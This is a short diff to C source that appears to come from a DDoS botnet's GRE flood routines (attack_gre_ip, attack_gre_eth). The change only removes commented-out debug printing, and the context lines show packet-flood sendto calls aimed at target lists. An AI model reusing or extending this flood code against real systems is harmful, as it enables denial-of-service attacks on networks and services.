@@ -152,13 +152,6 @@ void attack_gre_ip(uint8_t targs_len, struct attack_target *targs, uint8_t opts_
             targs[i].sock_addr.sin_port = 0;
             sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct grehdr) + sizeof (struct iphdr) + sizeof (struct udphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
         }
-/*
-#ifdef DEBUG
-        if (errno != 0)
-            printf("errno = %d\n", errno);
-        //break;
-#endif
-*/
     }
 }
 
@@ -315,12 +308,5 @@ void attack_gre_eth(uint8_t targs_len, struct attack_target *targs, uint8_t opts
             targs[i].sock_addr.sin_port = 0;
             sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct grehdr) + sizeof (struct ethhdr) + sizeof (struct iphdr) + sizeof (struct udphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
         }
-/*
-#ifdef DEBUG
-        if (errno != 0)
-            printf("errno = %d\n", errno);
-        //break;
-#endif*/
-        
     }
 }
